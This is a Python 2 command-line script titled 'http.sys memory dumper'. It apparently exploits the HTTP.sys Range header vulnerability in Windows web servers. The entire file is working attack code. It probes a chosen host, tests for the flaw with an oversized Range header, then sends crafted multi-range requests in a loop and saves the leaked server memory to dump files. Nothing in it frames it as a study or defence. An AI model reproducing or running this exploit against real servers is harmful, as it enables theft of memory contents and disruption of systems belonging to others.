import socket 
from socket import error as SocketError
import errno
import time
import sys
import os
import ssl
import math
import argparse




def calculate_range(length):
    try:
        length = int(length)
    except ValueError:
        return None

    block_size = 100
    current_block = 1
    range_header = "bytes=3-18446744073709551615"
    for i in range(length/block_size+1):
        next_block = current_block+block_size - 1
        range_header += ",{}-{}".format(current_block, next_block)
        current_block = next_block + 1
    return range_header


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='http.sys memory dumper')

    parser.add_argument('--host', required=True, action="store", dest='host')
    parser.add_argument('--uri', required=True, action="store", dest='uri')
    parser.add_argument('--port', action="store", dest="port", type=int, default=80)
    parser.add_argument('--ssl', action="store_true", dest="ssl", default=None)
    parser.add_argument('--cookie', action="store", default="123")
    parser.add_argument('--outdir', action="store", dest="outdir", default='data')

    cmd_options = parser.parse_args()

    
    
    
    if not os.path.exists(cmd_options.outdir):
        os.makedirs(cmd_options.outdir)
   
    try:
        while True:
            request_probe = "GET /{} HTTP/1.1\r\nHOST: {}\r\nCookie: {}\r\n\r\n".format(cmd_options.uri,cmd_options.host,cmd_options.cookie)
            try:
                if cmd_options.ssl is True:
                    context = ssl._create_unverified_context()
                    s = context.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM), server_hostname=cmd_options.host)
                else:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)    
                s.connect((cmd_options.host,cmd_options.port))
                s.send(request_probe)
                result = s.recv(10024)
                #print result
                file_size = 0
                range_header = ""
                response_first_line = result.split('\r\n')[0]
                if "200" in response_first_line:
                    search_string="Content-Length"
                    if search_string in result:
                        begin = result.index(search_string)
                        end = result[begin: begin+len(search_string)+100].index('\r\n')
                        file_size = result[begin+1+len(search_string): begin+end]
                        range_header = calculate_range(file_size)
                else:
                    print "[-]Looks like there is some HTTP error occured:\r\n{}".format(response_first_line)
                    sys.exit(-1)
            except socket.error, e:
                print e
                time.sleep(5)
                continue

            """Checking if vulnerable"""
            request = "GET /{} HTTP/1.1\r\nHOST: {}\r\nCookie: {}\r\nRange: {}\r\n\r\n".format(cmd_options.uri,cmd_options.host,cmd_options.cookie,calculate_range(0))
            s.send(request)
            if "The request has an invalid header name" in s.recv(10024):
                print "The target probably not vulnerable"
                sys.exit(0)


            request = "GET /{} HTTP/1.1\r\nHOST: {}\r\nCookie: {}\r\nRange: {}\r\n\r\n".format(cmd_options.uri,cmd_options.host,cmd_options.cookie,range_header)          
            recv_buffer = ''
            s.send(request)
            try:
                while True:
                    tmp_buf = ''
                    tmp_buf = s.recv(20000)
                    recv_buffer += tmp_buf
            except socket.timeout:
                s.close()
            except ssl.SSLError:
                s.close()
            except socket.error:
                try:
                    s.close()
                except:
                    pass
            s.close()
            print "received {} bytes of data".format(len(''.join(recv_buffer)))
            #Should be something like the size of original response
            if len(recv_buffer) > 1000 and cmd_options.outdir is not None:
                     
                with open(cmd_options.outdir + '/' + str(int(time.time())) + '.dump', 'wb') as file_:
                    file_.write(recv_buffer)
    except KeyboardInterrupt:
        print "Stopped"
        pass
